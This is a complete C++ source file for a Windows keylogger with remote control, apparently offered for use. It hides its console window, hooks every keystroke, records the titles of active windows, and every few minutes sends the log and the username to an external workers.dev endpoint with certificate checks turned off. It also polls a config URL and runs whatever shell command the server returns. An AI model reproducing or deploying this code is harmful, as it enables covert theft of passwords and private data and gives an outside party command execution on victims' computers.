#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <curl/curl.h>
#include <string>
#include <fstream>
#include <ctime>
#include <thread>
#include <chrono>
#include <sstream>
#include <filesystem>

void HideAppWindow() {
    HWND hwnd = GetConsoleWindow();  // Get the handle of the console window
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);  // Hide the window
    }
}


// Function to check internet connectivity
bool IsInternetConnected() {
    DWORD flags;
    BOOL connected = InternetGetConnectedState(&flags, 0);
    std::cout << (connected ? "Internet Connected" : "Internet Disconnected") << std::endl;
    return connected == TRUE;
}

// Function to convert virtual key codes to string representations
std::string VKCodeToString(UCHAR virtualKey) {
    UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);
    CHAR szName[128];
    int result = 0;
    switch (virtualKey)
    {
        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
        case VK_RCONTROL: case VK_RMENU:
        case VK_LWIN: case VK_RWIN: case VK_APPS:
        case VK_PRIOR: case VK_NEXT:
        case VK_END: case VK_HOME:
        case VK_INSERT: case VK_DELETE:
        case VK_DIVIDE:
        case VK_NUMLOCK:
            scanCode |= 0x100; // set extended bit
            break;
        default:
            break;
    }
    result = GetKeyNameTextA(scanCode << 16, szName, 128);
    if (result == 0)
        return std::string("Unknown");
    return std::string(szName);
}

// Function to get the title of the active window
std::string GetActiveWindowTitle() {
    HWND activeWindow = GetForegroundWindow();
    if (activeWindow == NULL) {
        return "No Active Window";
    }

    int length = GetWindowTextLength(activeWindow);
    if (length == 0) {
        return "Untitled Window";
    }

    std::string windowTitle;
    windowTitle.resize(length + 1);
    GetWindowTextA(activeWindow, &windowTitle[0], length + 1);
    windowTitle.resize(length);
    return windowTitle;
}

// Function to get the current user name
std::string GetUserName() {
    const char* username = std::getenv("USERNAME");
    if (username) {
        return std::string(username);
    }
    return "Unknown User";
}

// Function to log to file with timestamp
void LogToFile(const std::string& message, const std::string& filename = "written.txt") {
    std::ofstream outFile(filename, std::ios::app);
    if (outFile.is_open()) {
        std::time_t now = std::time(nullptr);
        char timestamp[26];
        ctime_s(timestamp, sizeof(timestamp), &now);
        std::string timestampStr(timestamp);
        timestampStr = timestampStr.substr(0, timestampStr.length() - 1);

        outFile << "[" << timestampStr << "] " << message << "\n";
        outFile.close();
    }
}

// Callback function for libcurl write operations
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

// Function to read and prepare file content
std::string PrepareFileContent(const std::string& filePath) {
    std::ifstream inputFile(filePath);
    std::ostringstream fileContent;

    if (inputFile) {
        fileContent << inputFile.rdbuf();
        inputFile.close();
    } else {
        std::cerr << "Error: Could not open file: " << filePath << std::endl;
        return "";
    }

    std::string user = GetUserName();
    fileContent << "\n--- END OF FILE ---\n";
    fileContent << "User: " << user << "\n";

    return fileContent.str();
}

// Function to get desktop path
std::string GetDesktopPath() {
    char desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
        return std::string(desktopPath);
    }
    return "";
}

// Function to send content to Cloudflare endpoint
bool UploadToCloudflare(const std::string& content) {
    CURL* curl;
    CURLcode res;
    bool success = false;
    std::string response;

    curl = curl_easy_init();
    if (curl) {
        // Truncate content if it's too long
        std::string truncatedContent = content.substr(0, 10000);

        // URL encode the content
        char* encoded_content = curl_easy_escape(curl, truncatedContent.c_str(), truncatedContent.length());

        // Construct URL with content as query parameter
        std::string url = "https://questlab-add-retrieve-posts-official.this-enable.workers.dev/saveTrackWindows?content="
                          + std::string(encoded_content);

        // Set up curl options
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        
        // Disable SSL certificate verification (only for testing)
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        // Setup write callback
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Perform the request
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " 
                      << curl_easy_strerror(res) << std::endl;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            // Handle different response codes
            switch (response_code) {
                case 200:
                    success = true;
                    std::cout << "File content uploaded successfully" << std::endl;
                    
                    // Process server response
                    if (!response.empty()) {
                        // Check for delete command
                        if (response.find("delete") != std::string::npos) {
                            std::remove("written.txt");
                            LogToFile("File deleted as per server command", "debug.log");
                        }
                        
                        // Check for display command
                        if (response.find("display") != std::string::npos) {
                            // Get desktop path
                            std::string desktopPath = GetDesktopPath();
                            if (!desktopPath.empty()) {
                                std::string messageFilePath = desktopPath + "\\message.txt";
                                
                                // Write full response to message.txt on desktop
                                std::ofstream messageFile(messageFilePath);
                                if (messageFile.is_open()) {
                                    messageFile << response;
                                    messageFile.close();
                                    LogToFile("Message written to desktop", "debug.log");
                                }
                            }
                        }
                    }
                    break;
                case 414:
                    std::cerr << "URI Too Long (414) - Truncating content" << std::endl;
                    success = true; // Consider it a success to prevent repeated attempts
                    break;
                default:
                    std::cerr << "Server returned response code: " << response_code << std::endl;
            }
        }

        // Clean up
        curl_free(encoded_content);
        curl_easy_cleanup(curl);
    }

    return success;
}

// Function to execute command in CMD
bool ExecuteCommand(const std::string& command) {
    std::cout << "Executing command: " << command << std::endl;
    int result = system(command.c_str());
    if (result == 0) {
        std::cout << "Command executed successfully" << std::endl;
        return true;
    } else {
        std::cout << "Command execution failed" << std::endl;
        return false;
    }
}

// Function to check configuration endpoint
bool CheckConfigEndpoint() {
    CURL* curl;
    CURLcode res;
    std::string response;
    bool success = false;

    curl = curl_easy_init();
    if (curl) {
        std::string url = "https://questlab-add-retrieve-posts-official.this-enable.workers.dev/getconfigneeded";

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " 
                      << curl_easy_strerror(res) << std::endl;
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            if (response_code == 200) {
                success = true;
                std::cout << "Config endpoint response: " << response << std::endl;

                // Handle display command
                if (response.find("display") != std::string::npos) {
                    std::string desktopPath = GetDesktopPath();
                    if (!desktopPath.empty()) {
                        std::string messageFilePath = desktopPath + "\\message.txt";
                        
                        std::ofstream messageFile(messageFilePath);
                        if (messageFile.is_open()) {
                            messageFile << response;
                            messageFile.close();
                            std::cout << "Message written to desktop" << std::endl;
                        }
                    }
                }

                // Handle command execution
                if (response.find("command") != std::string::npos) {
                    std::istringstream iss(response);
                    std::string line;
                    std::getline(iss, line);  // Skip first line
                    if (std::getline(iss, line)) {
                        ExecuteCommand(line);
                    }
                }

                // Handle delay
                if (response.find("delay") != std::string::npos) {
                    std::istringstream iss(response);
                    std::string line;
                    std::getline(iss, line);  // Skip first line
                    if (std::getline(iss, line)) {
                        int delayMinutes = std::stoi(line);
                        std::cout << "Delaying message sending by " << delayMinutes << " minutes" << std::endl;
                        std::this_thread::sleep_for(std::chrono::minutes(delayMinutes));
                    }
                }
            }
        }

        curl_easy_cleanup(curl);
    }

    return success;
}

// Windows procedure for keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        switch (wParam) {
            case WM_KEYDOWN:
            case WM_SYSKEYDOWN:
            {
                KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
                std::string key = VKCodeToString(pKeyStruct->vkCode);
                
                // Output to console
                std::cout << "Key pressed: " << key << "\n";
                
                // Log key press
                LogToFile("Key: " + key);
                
                break;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Main tracking function
void TrackingThread() {
    std::cout << "Keyboard and Window Tracker started." << std::endl;
    
    // Log initial active window
    LogToFile("Active Window: " + GetActiveWindowTitle());

    // Install the low-level keyboard hook
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cout << "Failed to install hook!" << std::endl;
        return;
    }

    // Track active window and perform periodic tasks
    HWND lastActiveWindow = NULL;
    auto lastUploadTime = std::chrono::steady_clock::now();
    auto lastInternetCheckTime = std::chrono::steady_clock::now();
    auto lastConfigCheckTime = std::chrono::steady_clock::now();

    while (true) {
        auto now = std::chrono::steady_clock::now();
        
        // Check active window every iteration
        HWND currentActiveWindow = GetForegroundWindow();
        if (currentActiveWindow != lastActiveWindow) {
            std::string windowTitle = GetActiveWindowTitle();
            std::cout << "Active Window Changed: " << windowTitle << std::endl;
            LogToFile("Active Window: " + windowTitle);
            lastActiveWindow = currentActiveWindow;
        }

        // Check internet connectivity every 1 minute
        auto internetCheckDuration = std::chrono::duration_cast<std::chrono::minutes>(now - lastInternetCheckTime);
        if (internetCheckDuration.count() >= 1) {
            lastInternetCheckTime = now;
            IsInternetConnected();
        }

        // Check config endpoint every 2 minutes
        auto configCheckDuration = std::chrono::duration_cast<std::chrono::minutes>(now - lastConfigCheckTime);
        if (configCheckDuration.count() >= 2) {
            lastConfigCheckTime = now;
            if (IsInternetConnected()) {
                CheckConfigEndpoint();
            }
        }

        // Check if 5 minutes have passed since last upload
        auto uploadDuration = std::chrono::duration_cast<std::chrono::minutes>(now - lastUploadTime);
        if (uploadDuration.count() >= 5) {
            // Prepare and upload file
            std::string fileContent = PrepareFileContent("written.txt");
            if (!fileContent.empty()) {
                if (UploadToCloudflare(fileContent)) {
                    lastUploadTime = now;
                } else {
                    // If upload fails, wait 2 minutes before trying again
                    std::this_thread::sleep_for(std::chrono::minutes(2));
                    lastUploadTime = std::chrono::steady_clock::now();
                }
            }
        }

        // Run the message loop
        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Small sleep to prevent high CPU usage
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    // Uninstall the hook (this part will not be reached in this implementation)
    UnhookWindowsHookEx(hHook);
}


int main() {
    HideAppWindow();
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Start tracking in a separate thread
    std::thread trackingThread(TrackingThread);

    // Wait for the tracking thread to complete (which it never will)
    trackingThread.join();

    // Cleanup libcurl
    curl_global_cleanup();

    return 0;
}